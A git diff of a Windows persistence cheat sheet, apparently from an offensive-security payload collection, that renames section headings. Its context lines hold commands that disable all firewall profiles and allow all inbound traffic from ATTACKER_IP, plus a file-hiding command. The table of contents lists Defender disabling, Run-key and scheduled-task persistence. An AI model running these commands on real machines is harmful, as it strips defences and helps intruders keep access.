@@ -5,7 +5,7 @@
 * [Tools](#tools)
 * [Disable Windows Defender](#disable-windows-defender)
 * [Disable Windows Firewall](#disable-windows-firewall)
-* [Userland](#userland)
+* [Simple User](#simple-user)
     * [Registry HKCU](#registry-hkcu)
     * [Startup](#startup)
     * [Scheduled Task](#scheduled-task)
@@ -51,7 +51,7 @@ NetSh Advfirewall set allprofiles state off
 New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
 ```
 
-## Userland
+## Simple User
 
 Set a file as hidden
 
@@ -59,7 +59,7 @@ Set a file as hidden
 attrib +h c:\autoexec.bat
 ```
 
-### Registry
+### Registry HKCU
 
 Create a REG_SZ value in the Run key within HKCU\Software\Microsoft\Windows.
 
